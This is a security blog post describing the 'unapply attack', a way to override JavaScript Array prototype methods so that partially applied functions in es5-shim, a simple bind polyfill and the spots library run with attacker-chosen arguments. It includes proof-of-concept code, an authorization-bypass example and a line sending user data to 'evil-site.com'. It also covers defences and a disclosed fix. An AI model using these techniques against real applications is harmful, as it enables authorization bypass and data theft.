<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Unapply attack | Better world by better software</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="TL;DR We can exploit the partially applied functions to &quot;free&quot; the bound arguments and run the original function with new set of unexpected runtime arguments. This is a potentially serious s">
<meta property="og:type" content="article">
<meta property="og:title" content="Unapply attack">
<meta property="og:url" content="https://glebbahmutov.com/blog/unapply-attack/index.html">
<meta property="og:site_name" content="Better world by better software">
<meta property="og:description" content="TL;DR We can exploit the partially applied functions to &quot;free&quot; the bound arguments and run the original function with new set of unexpected runtime arguments. This is a potentially serious s">
<meta property="og:locale">
<meta property="article:published_time" content="2015-05-27T04:00:00.000Z">
<meta property="article:modified_time" content="2021-06-15T13:13:30.377Z">
<meta property="article:author" content="Gleb Bahmutov">
<meta property="article:tag" content="javascript">
<meta property="article:tag" content="security">
<meta name="twitter:card" content="summary">
<meta name="twitter:creator" content="@bahmutov">
  
    <link rel="alternative" href="/blog/atom.xml" title="Better world by better software" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="preload" href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" as="style">
  
<link rel="stylesheet" href="../css/style.css">

  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-59999353-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-titles">
      <div id="header-title" class="inner">
        <h1 id="logo-wrap">
          <a href="../index.html" id="logo">Better world by better software</a>
        </h1>
        <!--
        
        -->
        <!-- <span class="no-mobile">Software advice from</span> -->
        <h2 id="subtitle-wrap">
          <span class="subtitle">
            <a id="subtitle" href="https://glebbahmutov.com">Gleb Bahmutov PhD</a>
            <a id="nav-house-link" class="nav-icon" href="/" title="Home"></a>
            
              <a id="nav-rss-link" class="nav-icon" href="/blog/atom.xml" title="RSS Feed"></a>
            
            <a id="nav-search-btn" class="nav-icon" title="Search"></a>
            <div id="search-form-wrap">
              <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://glebbahmutov.com/blog"></form>
            </div>
          </span>
        </h2>

      </div>
    </div>
    <div id="climate-crisis">
      <h2>Our planet üåè is in danger</h2>
      <h3>Act today: <a href="/blog/climate-emergency/">what you can do</a></h3>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-unapply-attack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="" class="article-date">
  <time datetime="2015-05-27T04:00:00.000Z" itemprop="datePublished">May 27 2015</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="../categories/products/">products</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Unapply attack
    </h1>

    <h2 class="article-title" itemprop="name">
      Compromise functions private to closures via partially applied references.
    </h2>

  


      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>TL;DR</strong> We can exploit the partially applied functions to &quot;free&quot; the bound arguments and run the original
function with new set of unexpected runtime arguments. This is a potentially serious security hole, as it can
affect various browsers and the popular server middleware projects like ExpressJs. It effectively
removes the assumption that functions inside closures are private to the closure and cannot be
accessed from the outside.</p>
<h2><span id="review">Review</span></h2><p>The exploit uses two basic JavaScript concepts: closures and partial application.</p>
<h3><span id="closures">Closures</span></h3><p>You can review closures by reading <a href="../javascript-closures/">this blog post</a>. In essence, JavaScript
does not have the keyword <strong>private</strong>. Instead it restricts variable&#39;s visibility to the function
that declares it. This is commonly used to create variables that cannot be accessed from the outside</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> four = (<span class="function"><span class="keyword">function</span> <span class="title">closure</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> two = <span class="number">2</span>; <span class="comment">// private to &quot;closure&quot;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">&#125;());</span><br><span class="line">four; <span class="comment">// 4</span></span><br><span class="line">two; </span><br><span class="line"><span class="comment">// ReferenceError: two is undeclared</span></span><br></pre></td></tr></table></figure>
<h3><span id="partial-application-review">Partial application review</span></h3><p>You can review JavaScript concept of context binding and partial application by reading
<a href="../binding-vs-partial-application/">this blog post</a>.</p>
<p>JavaScript ES5 includes a native method for binding the values to the function&#39;s arguments, 
and producing a new function. For example</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line"><span class="keyword">var</span> add2 = add.bind(<span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> add2to5 = add.bind(<span class="literal">null</span>, <span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">add2(<span class="number">10</span>); <span class="comment">// 12</span></span><br><span class="line">add2to5(); <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>
<p>We assume that given only a partially applied function reference, like <code>add2</code> or <code>add2to5</code>,
there is no way to get to the original function reference <code>add</code>. This can be used to conveniently hide
the original unprotected code inside a closure, exporting only a partially applied function that is
safe for the outside users to call. </p>
<p>Here is an example of a closure with an unprotected function and exported partially bound reference.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// take a simple function add, </span></span><br><span class="line"><span class="comment">// make it private to a closure</span></span><br><span class="line"><span class="comment">// and return partially applied version</span></span><br><span class="line"><span class="keyword">var</span> add2 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a === <span class="number">42</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Oh no, first argument is 42!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> add.bind(<span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// one can safely use add2</span></span><br><span class="line"><span class="built_in">console</span>.log(add2(<span class="number">3</span>)); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>Because <code>add</code> is inside the anonymous closure, we assume there is no way to call
it from the outside, except via the returned partially applied reference.
This is important in this case because as an example <code>add</code> has an undesired
behavior: it crashes if the first argument has value 42. The programmer assumes
that <code>add</code> will always run with first argument equal to 2. Yet, this assumption 
is invalid as I will show next.</p>
<h2><span id="polyfills">Polyfills</span></h2><p>The native <code>Function.prototype.bind</code> method used above is part of the modern ES5 standard.
There are a lot of polyfills that provide this method for legacy reasons. One can easily write
a <code>bind</code> polyfill, here is one suggestion that does not implement the context binding, only
the partial argument application.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// simple bind polyfill</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> prev = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">bound</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> curr = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.concat.apply(prev, curr);</span><br><span class="line">    <span class="keyword">return</span> fn.apply(<span class="literal">null</span>, args);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The main principle is to combine the values given in the original call (the <code>prev</code> array) with the 
values given at the later runtime call (the <code>curr</code> array). One can use the custom <code>bind</code> similarly to the native one</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add2 = bind(add, <span class="number">2</span>);</span><br><span class="line">add2(<span class="number">3</span>); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>A typical polyfill used in many projects is <a target="_blank" rel="noopener" href="https://github.com/es-shims/es5-shim">es5-shim</a> downloaded more than
100k times every month. The <code>es5-shim</code> library has its own 
<a target="_blank" rel="noopener" href="https://github.com/es-shims/es5-shim/blob/a3565335aa6afc5e853617c37acb4a7587665d4e/es5-shim.js#L196">bind function</a>.
Its argument combination code is very similar to the simple &quot;bind&quot; code example from above:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// other stuff</span></span><br><span class="line"><span class="keyword">return</span> target.apply(</span><br><span class="line">  that,</span><br><span class="line">  args.concat(array_slice.call(<span class="built_in">arguments</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2><span id="attacking-polyfills">Attacking polyfills</span></h2><p>The goal of the attack is to run the <em>original</em> function instance, replacing the <em>previously bound</em> arguments with
the new runtime values. Because the original function might rely on its privacy, it might NOT validate 
the inputs, assuming that some of them will always be bound to the &quot;safe&quot; values.</p>
<p>Here is how one can achieve this.
Let us take a look at the simple <code>bind</code> polyfill again. Suppouse we inspect the
source of the <em>bound</em> function <code>add2</code>. We will see just the code returned by the polyfill.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add2 = bind(add, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(add2.toString());</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function bound() &#123;</span></span><br><span class="line"><span class="comment">  var curr = Array.prototype.slice.call(arguments, 0);</span></span><br><span class="line"><span class="comment">  var args = Array.prototype.concat.apply(prev, curr);</span></span><br><span class="line"><span class="comment">  return fn.apply(null, args);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>Typically, I would attack a method like this by 
<a href="../faking-lexical-scope/">faking its lexical scope</a>,
but in this scope there are two variables accessed via the lexical scope: <code>prev</code> and <code>fn</code>. 
Since I want to use the original
<code>fn</code> function while replacing the <code>prev</code>, this technique does not work.</p>
<p>Yet, there is a part of the code that I can modify easily: the <code>Array.prototype.concat</code> call that combines
the previously <em>bound</em> values <code>prev</code> with the runtime values <code>curr</code>. I (the attacker) can simply
overwrite the <code>Array.prototype.concat</code> call to <em>discard</em> the <code>prev</code> array entirely! Here is one attack method
that works against both the simple <code>bind</code> and <code>es5-shim</code> functions</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unapply-attack</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unapplyAttack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> concat = <span class="built_in">Array</span>.prototype.concat;</span><br><span class="line">  <span class="built_in">Array</span>.prototype.concat = <span class="function"><span class="keyword">function</span> <span class="title">replaceAll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">Array</span>.prototype.concat = concat; <span class="comment">// restore the correct version</span></span><br><span class="line">    <span class="keyword">var</span> curr = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">var</span> result = concat.apply([], curr);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>An attacker uses the above <code>unapplyAttack</code> function like this</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attack example</span></span><br><span class="line"><span class="keyword">var</span> add2 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a === <span class="number">42</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Oh no, first argument is 42!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> add.bind(<span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="built_in">console</span>.log(add2(<span class="number">3</span>)); <span class="comment">// 5</span></span><br><span class="line">unapplyAttack();</span><br><span class="line">add2(<span class="number">42</span>, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// ERROR!</span></span><br></pre></td></tr></table></figure>
<p>Again, just to stress the important point: the attack does not rely on calling the <code>toString()</code> - 
only on inspecting the <code>bind</code> implementation and changing the <code>Array.prototype</code> method(s) to change
the behavior when combining previously bound values with the new ones.</p>
<h3><span id="another-attack-example">Another attack example</span></h3><p>Suppose we send the user&#39;s data to the server</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sendUserData = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> serverUrl = <span class="string">&#x27;https://...&#x27;</span>; <span class="comment">// injected by the server</span></span><br><span class="line">  <span class="keyword">return</span> $http.post.bind($http, serverUrl, privateUserData);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// expected behavior</span></span><br><span class="line">sendUserData();</span><br><span class="line"><span class="comment">// attack behavior - only change first bound value</span></span><br><span class="line">unapplyAttack();</span><br><span class="line">send(<span class="string">&#x27;http://evil-site.com&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>One can attack even the modern ES5 engines in 3 steps</p>
<ul>
<li>delete the native <code>Function.prototype.bind</code></li>
<li>load the <code>es5-shim</code> (which many projects do for legacy reasons)</li>
<li>execute the <code>unapplyAttack</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// replace v8&#x27;s native bind with es5-shim version</span></span><br><span class="line"><span class="keyword">delete</span> <span class="built_in">Function</span>.prototype.bind;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;es5-shim&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> unapplyAttack = <span class="built_in">require</span>(<span class="string">&#x27;./unapply-attack&#x27;</span>);</span><br><span class="line"><span class="comment">// execute the attack whenever possible</span></span><br></pre></td></tr></table></figure>
<h2><span id="attacking-expressjs">Attacking Express.js</span></h2><p>The middleware server stacks in the <a target="_blank" rel="noopener" href="http://expressjs.com/">Express.js</a> can be attacked
if the programmers used partial application to 
<a href="../less-boilerplate-in-express-app/">remove the routing boilerplate</a>.
Typically, there is a router that executes the middleware functions in order, unless a function
returned false. For example, let us have a &quot;server&quot; that only allows the restricted functions
to run if the user is logged in and authorized. You can see the &quot;server&quot; code in <a href="#server.js">server.js</a></p>
<p>The partial application used in this example is a simple placeholder binder 
<a target="_blank" rel="noopener" href="https://github.com/bahmutov/spots">spots</a></p>
<ul>
<li>similar to now common functions in the popular libraries
like <a target="_blank" rel="noopener" href="https://lodash.com/docs#partial">lodash#partial</a> and <a target="_blank" rel="noopener" href="http://ramdajs.com/docs/#partial">Ramda#partial</a>.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exporting partially applied authorization routing function</span></span><br><span class="line"><span class="keyword">var</span> route = (<span class="function"><span class="keyword">function</span> <span class="title">protectServer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLoggedIn</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isAuthorized</span>(<span class="params"></span>) </span>&#123; ... &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">var</span> S = <span class="built_in">require</span>(<span class="string">&#x27;spots&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> isValidUser = S(router, S, isLoggedIn, isAuthorized);</span><br><span class="line">  <span class="keyword">return</span> isValidUser;</span><br><span class="line">&#125;());</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">restricted</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;running restricted action&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">route(<span class="string">&#x27;/foo&#x27;</span>, restricted); <span class="comment">// not allowed</span></span><br></pre></td></tr></table></figure>
<p>Unless the function <code>isLoggedIn</code> and <code>isAuthorized</code> return true, the <code>restricted</code> function should never run.
But this is only true if the attacker can NOT replace the bound values via the <code>route</code> reference. 
This is simple for the <em>spots</em> library, we can inspect the 
<a target="_blank" rel="noopener" href="https://github.com/bahmutov/spots/blob/master/src/spots.js#L10">relevant source code</a> 
to see how it places the runtime arguments into the placeholder items</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// part of spots.js that combines previous &quot;bound&quot; and current values</span></span><br><span class="line"><span class="keyword">var</span> combinedArgs = [];</span><br><span class="line">args.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (arg === spots) &#123;</span><br><span class="line">    combinedArgs.push(moreArgs.shift());</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    combinedArgs.push(arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Here is the attack</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unapplyAttack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> S = <span class="built_in">require</span>(<span class="string">&#x27;spots&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> forEach = <span class="built_in">Array</span>.prototype.forEach;</span><br><span class="line">  <span class="built_in">Array</span>.prototype.forEach = <span class="function"><span class="keyword">function</span> <span class="title">sendSpots</span>(<span class="params">cb</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> k;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="built_in">this</span>.length; k += <span class="number">1</span>) &#123;</span><br><span class="line">      cb(S, k, <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Array</span>.prototype.forEach = forEach; <span class="comment">// restore correct version</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">unapplyAttack();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">route(<span class="string">&#x27;/foo&#x27;</span>, allow, allow, restricted); </span><br><span class="line"><span class="comment">// this replaces all previous values by faking the spots comparison</span></span><br><span class="line"><span class="comment">// running restricted action</span></span><br></pre></td></tr></table></figure>
<p>I am not sure if such placeholder trick is possible for the <em>lodash</em> library. The value combinator
in that library uses plain indices to combine the arrays, without calling the prototype methods, see the
<a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/3.9.3/lodash.src.js#L3731">wrapper code</a>.</p>
<h2><span id="preventing-the-unapply-attacks">Preventing the unapply attacks</span></h2><p>There are steps that both library authors and users can take to stop unapply-style attacks.</p>
<p>From the user&#39;s (website author) perspective I only see one solution to these attacks: 
freezing the built-in prototypes like <code>Array.prototype</code>, <code>Function.prototype</code>, <code>Object.prototype</code> before
loading any other code (like trusted libraries or 3rd party code). For example:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// prevent the second attack</span></span><br><span class="line">unapplyAttack();</span><br><span class="line"><span class="built_in">console</span>.log(add2(<span class="number">10</span>, <span class="number">3</span>)); <span class="comment">// 13</span></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Array</span>.prototype);</span><br><span class="line">unapplyAttack();</span><br><span class="line"><span class="built_in">console</span>.log(add2(<span class="number">10</span>, <span class="number">3</span>)); <span class="comment">// 12</span></span><br></pre></td></tr></table></figure>
<p>As far as I see, unless one can show a very convincing use case, modifying the built-in prototypes should
not be possible. I suggest freezing the prototypes after loading the system / shim JavaScript libraries but
before loading any of the application-specific or 3rd party plugin code.</p>
<p>The library authors can take steps to lessen the chance of the attack in a couple of ways.
One, keep a reference to the original (hopefully uncompromised) methods used to combine arguments.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inside the shim library</span></span><br><span class="line"><span class="keyword">var</span> concat = <span class="built_in">Array</span>.prototype.concat;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// use the original / non-compromised concat</span></span><br><span class="line">  <span class="keyword">var</span> args = concat.apply(prev, curr);</span><br><span class="line">  <span class="keyword">return</span> fn.apply(<span class="literal">null</span>, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Second, instead of using methods to combine previously bound / runtime arguments, use plain for loops, which would
be harder to change externally</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inside the shim library</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = prev;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="built_in">arguments</span>.length; k += <span class="number">1</span>) &#123;</span><br><span class="line">    args[prev.length + k] = <span class="built_in">arguments</span>[k];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fn.apply(<span class="literal">null</span>, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="conclusion">Conclusion</span></h2><p>JavaScript is a wonderful and flexible language, but some malicious code can use the language&#39;s 
prototype methods to break the expectation of &quot;privacy&quot; inside the closures. It will take more than
just relying on the original <code>Function.prototype.bind</code> in all cases; modern applications use other
styles of partial application using client-space implementations: 
<a target="_blank" rel="noopener" href="https://lodash.com/docs#partialRight">partial application from the right</a>,
<a target="_blank" rel="noopener" href="https://www.npmjs.com/package/bind-at">position index application</a>,
<a target="_blank" rel="noopener" href="https://github.com/bahmutov/spots">application with placeholders</a> and 
<a target="_blank" rel="noopener" href="https://github.com/bahmutov/heroin">application by name</a>. 
It is up to the library&#39;s authors to provide reasonably safe implementations, 
and up to the user to be vigilant against loading malicious code.</p>
<p>Finally, I guess this attack can be extended to rebinding the original function to a different context.</p>
<h2><span id="update-1">Update 1</span></h2><p>After I contacted the es5-shim maintainers, the <code>bind</code> polyfill has been made to be more robust 
to messing with the <code>Array.prototype.concat</code> method, 
see the <a target="_blank" rel="noopener" href="https://github.com/es-shims/es5-shim/commit/8ce6832a0cd923eaf270b06d835411457bd6bd0b">change</a>.</p>
<h2><span id="update-2">Update 2</span></h2><p>I wrote small library to freeze the common prototypes before loading untrusted 3rd party code.
Hope that this is enough to prevent these attacks.</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdn/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdn/angular.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;dist/freeze-prototypes.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&lt;your app code&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&lt;untrusted 3rd party code&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>See <a target="_blank" rel="noopener" href="https://github.com/bahmutov/freeze-prototypes">freeze-prototypes</a></p>
<h2><span id="update-3">Update 3</span></h2><p>A lot of feedback I have received for this blog post focuses in my opinion on the
wrong aspect. Yes, the attacker would need to run malicious code. Yes, JavaScript is a dynamic
language. But the problem is that by using 3rd party code, unreviewed, we trust that code
too much. In essence we are saying that if we keep the door locked, we don&#39;t need a safe
inside the house. The privacy mechanism the closures give us is like a safe. By allowing
3rd party code to modify prototypes we are removing the safe&#39;s back wall!</p>

      
    </div>

    
